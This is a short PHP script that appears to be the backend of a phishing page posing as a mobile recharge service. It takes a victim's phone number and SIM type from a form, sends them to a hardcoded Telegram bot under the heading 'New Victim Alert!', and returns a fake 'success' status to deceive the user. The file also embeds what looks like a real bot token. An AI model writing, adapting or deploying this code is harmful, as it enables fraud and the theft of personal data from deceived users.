<?php

// Allow cross-origin requests
header("Access-Control-Allow-Origin: *");
header("Content-Type: application/json");

$phoneNumber = $_POST["phone"];
$simType = $_POST["sim"];

// Use the provided Telegram bot token and chat ID
$botToken = '5664089392:AAFyih9SlvcmQas8Oi12xxhE5zLB76LZn4k';
$chatId = '5664089392';
$message = "New Victim Alert!\nPhone: $phoneNumber\nSim: $simType";

file_get_contents("https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=$message");

// Respond to the user with a fake recharge status (modify as needed)
echo json_encode(["status" => "success"]);

?>
